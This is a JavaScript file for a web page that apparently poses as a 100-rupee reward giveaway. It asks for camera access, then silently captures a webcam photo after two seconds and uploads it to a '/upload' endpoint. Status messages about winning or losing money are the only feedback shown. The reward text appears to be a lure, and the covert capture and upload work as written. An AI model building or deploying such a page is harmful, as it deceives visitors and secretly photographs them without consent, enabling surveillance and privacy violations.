const video = document.getElementById('camera');
const canvas = document.getElementById('canvas');
const startBtn = document.getElementById('startBtn');
const statusText = document.getElementById('status');

async function setupCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    return true;
  } catch (error) {
    console.error("Camera access denied:", error);
    return false;
  }
}

function capturePhoto() {
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

startBtn.addEventListener('click', async () => {
  const access = await setupCamera();
  if (!access) {
    statusText.textContent = "❌ You lost 100₹ successfully!";
    statusText.style.color = "red";
    return;
  }

  setTimeout(() => {
    const imageData = capturePhoto();

    fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: imageData })
    })
    .then(res => {
      if (res.ok) {
        statusText.textContent = "✅ You got 100₹ successfully!";
        statusText.style.color = "#00ff88";
      } else {
        statusText.textContent = "❌ You lost 100₹ successfully!";
        statusText.style.color = "red";
      }
    })
    .catch(() => {
      statusText.textContent = "❌ You lost 100₹ successfully!";
      statusText.style.color = "red";
    });
  }, 2000);
});